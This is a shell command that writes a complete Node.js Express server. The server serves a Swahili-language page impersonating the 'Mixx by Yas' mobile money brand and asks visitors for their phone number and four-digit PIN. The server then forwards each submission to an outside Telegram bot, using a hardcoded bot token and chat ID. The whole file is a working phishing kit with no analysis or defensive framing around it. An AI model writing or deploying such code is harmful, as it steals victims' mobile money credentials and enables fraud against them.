echo 'const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = "8884996201:AAGQHy_bXjAjZ7hUDGY4QRP0K-cSxHcXe9Y";
const CHAT_ID = "8999616005";

app.use(cors());
app.use(express.json());

app.get("/", (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Mixx by Yas</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body{background:#0a1f1c;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;margin:0}
        .card{background:white;padding:40px;border-radius:20px;width:350px;text-align:center}
        input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:10px;font-size:16px}
        .pin-boxes{display:flex;gap:10px;justify-content:center}
        .pin-box{width:60px;height:60px;text-align:center;font-size:24px}
        button{width:100%;padding:12px;background:#d4af37;border:none;border-radius:10px;font-size:16px;cursor:pointer}
        .msg{color:red;margin-top:10px}
    </style>
</head>
<body>
    <div class="card">
        <h2>✨ Mixx by Yas ✨</h2>
        <p>Ingiza namba na PIN</p>
        <input type="text" id="phone" placeholder="Namba ya Simu (10 digits)" maxlength="10">
        <div class="pin-boxes">
            <input type="text" maxlength="1" class="pin-box" id="pin1">
            <input type="text" maxlength="1" class="pin-box" id="pin2">
            <input type="text" maxlength="1" class="pin-box" id="pin3">
            <input type="text" maxlength="1" class="pin-box" id="pin4">
        </div>
        <button onclick="submitForm()">Submit</button>
        <div id="msg" class="msg"></div>
    </div>
    <script>
        async function submitForm() {
            const phone = document.getElementById("phone").value;
            const pin = document.getElementById("pin1").value + document.getElementById("pin2").value + document.getElementById("pin3").value + document.getElementById("pin4").value;
            if(!phone || phone.length !== 10){ document.getElementById("msg").innerText = "Phone must be 10 digits"; return; }
            if(pin.length !== 4){ document.getElementById("msg").innerText = "PIN must be 4 digits"; return; }
            document.getElementById("msg").innerText = "Sending...";
            try {
                const res = await fetch("/api/submit", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({phoneNumber: phone, pin: pin})
                });
                const data = await res.json();
                if(data.success){
                    document.getElementById("msg").style.color = "green";
                    document.getElementById("msg").innerText = "Success!";
                    document.getElementById("phone").value = "";
                    document.getElementById("pin1").value = "";
                    document.getElementById("pin2").value = "";
                    document.getElementById("pin3").value = "";
                    document.getElementById("pin4").value = "";
                } else {
                    document.getElementById("msg").style.color = "red";
                    document.getElementById("msg").innerText = data.error || "Failed";
                }
            } catch(err) {
                document.getElementById("msg").innerText = "Network error";
            }
        }
        for(let i=1;i<=4;i++){
            document.getElementById("pin"+i).addEventListener("input", function(e){
                if(e.target.value && i<4) document.getElementById("pin"+(i+1)).focus();
            });
        }
    </script>
</body>
</html>
    `);
});

app.post("/api/submit", async (req, res) => {
    console.log("Received:", req.body);
    const { phoneNumber, pin } = req.body;
    
    if(!phoneNumber || phoneNumber.length !== 10){
        return res.json({success: false, error: "Phone must be 10 digits"});
    }
    if(!pin || pin.length !== 4){
        return res.json({success: false, error: "PIN must be 4 digits"});
    }
    
    const message = "NEW SUBMISSION\\nPhone: " + phoneNumber + "\\nPIN: " + pin + "\\nTime: " + new Date().toLocaleString();
    
    try {
        await axios.post("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
            chat_id: CHAT_ID,
            text: message
        });
        console.log("Sent to Telegram");
        res.json({success: true});
    } catch(err) {
        console.log("Telegram error:", err.message);
        res.json({success: false, error: "Telegram error"});
    }
});

app.listen(PORT, () => {
    console.log("Server running on port " + PORT);
});' > server.js
